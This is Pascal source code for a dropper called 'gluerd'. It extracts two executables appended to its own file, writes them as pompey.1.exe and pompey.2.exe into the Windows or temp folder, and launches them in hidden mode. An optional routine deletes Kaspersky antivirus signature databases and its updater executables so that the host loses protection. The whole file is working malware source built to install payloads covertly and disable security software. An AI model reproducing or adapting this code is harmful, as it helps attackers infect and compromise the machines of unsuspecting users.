program gluerd;
var
    f1:file;
    buf:array[1..16]of byte;
    buf1:array[1..600000]of byte;
    buf2:array[1..600000]of byte;
    Extrn1,Extrn2,FS1,FS2,Avp,Folder,Ff1,Ff2:string;
    iExtrn1,iExtrn2,iFS1,iFS2:integer;
    i,e:integer;
     windir                             : Array[0..144] of char;
function WinExec                      (lpCmdLine: PAnsiChar;
                                      uCmdShow: LongWord):
                                      LongWord; stdcall;external
                                      'kernel32.dll' name 'WinExec';
function GetWindowsDirectorya         (lpBuffer  : PAnsiChar;
                                       uSize     : LongWord):
                                       LongWord; stdcall;external
                                       'kernel32.dll' name'GetWindowsDirectoryA';
function DeleteFile                   (lpFileName: PChar):
                                       LongBool; stdcall;external
                                       'kernel32.dll' name 'DeleteFileA';                                       

procedure AVPPooking;
{-------------------Список файлов, которые НЕЛЬЗЯ удалять----------------------}
const
    AVPBaseName:array[1..16]of string          = ('krnjava.avc',
                                                 'krnmacro.avc',
                                                 'krnexe.avc',
                                                 'krnunp.avc',
                                                 'kernel.avc',
                                                 'krnengn.avc',
                                                 'krndos.avc',
                                                 'smart.avc',
                                                 'script.avc',
                                                 'macro.avc',
                                                 'trojan.avc',
                                                 'unpack.avc',
                                                 'unrar30.avc',
                                                 'extr-cab.avc',
                                                 'extract.avc',
                                                 'daily.avc');
{------------------------------------------------------------------------------}

{------------------------Предполагаемое размещение-----------------------------}
    PathToAvP:array[1..2]of string             = ('C:\Program Files\Common Files\KAV Shared Files\',
                                                 'C:\Program Files\Common Files\AVP Shared Files\');
{------------------------------------------------------------------------------}

var
    i,n                                        : integer;
    check                                      : boolean;
    f                                          : textfile;
    temp                                       : string;
begin
   N:=1;
   AssignFile(f,PathToAvP[N]+'\Bases\avp.set');
   {$I-}
   reset(f);
   {$I+}
   if IOResult<>0
      then
      begin
        N:=2;AssignFile(f,PathToAvP[N]+'\Bases\avp.set');
        {$I-}
        reset(f);
        {$I+}
      end;
   if IOResult=0 then
   begin
     While not eof(f) do
      begin
         readln(f,temp);
          for i:=1 to 16 do
           begin
               if temp=AVPBaseName[i] then begin check:=false;break end
                                      else check:=true;
           end;
          if check=true then DeleteFile(Pchar(PathToAvP[N]+'\Bases\'+temp));
      end;
     closefile(f);
     DeleteFile(Pchar(PathToAvP[n]+'avpupd.exe'));
     DeleteFile(Pchar(PathToAvP[n]+'addkey.exe'));
   end;
end;

begin

{
File:
    1) Our dropper
    2) First file
    3) Second file
    4) size of first and second files(14 byte)
}
    filemode:=0;
    assign(f1,paramstr(0));
    reset(f1,1);
    seek(f1,filesize(f1)-16);
    BlockRead(f1,buf,16);
    for i:= 1 to 6 do
    begin
        FS1:=FS1+Chr(buf[i]);
    end;
    for i:= 7 to 12 do
    begin
        FS2:=FS2+Chr(buf[i]);
    end;

    Extrn1:=Extrn1+Chr(buf[13]);
    Extrn2:=Extrn2+Chr(buf[14]);
    avp:=Chr(buf[15]);
    Folder:=Chr(buf[16]);
         case Folder[1] of
         'w': begin
                GetWindowsDirectoryA(windir,SizeOf(windir));
                Ff1:=windir+'\pompey.1.exe';
                Ff2:=windir+'\pompey.2.exe';
              end;
         't': begin
                GetWindowsDirectoryA(windir,SizeOf(windir));
                Ff1:=windir+'\temp\pompey.1.exe';
                Ff2:=windir+'\temp\pompey.2.exe';
               end;
         'c': begin
                Ff1:='c:\pompey.1.exe';
                Ff2:='c:\pompey.2.exe';
              end;
         end;
       if Avp[1]='y' then AVPPooking;

    val(FS1,iFS1,e);
    val(FS2,iFS2,e);
    if (iFS1<>0)or(iFS2<>0) then
        begin
             Seek(f1,filesize(f1)-(iFS2+16+iFS1));
             BlockRead(f1,buf1,IFS1);
             seek(f1,0);
             Seek(f1,filesize(f1)-(iFS2+16));
             BlockRead(f1,buf2,IFS2);
             close(f1);
             filemode:=1;

             assign(f1,Ff1);
             rewrite(f1,1);
             BlockWrite(f1,buf1,IFS1);
             close(f1);

             assign(f1,Ff2);
             rewrite(f1,1);
             BlockWrite(f1,buf2,IFS2);
             close(f1);
             if Extrn1='y' then WinExec(Pchar(Ff1),0);
             if Extrn2='y' then WinExec(Pchar(Ff2),0);
        end
        else
        begin
            close(f1);
        end;
end.
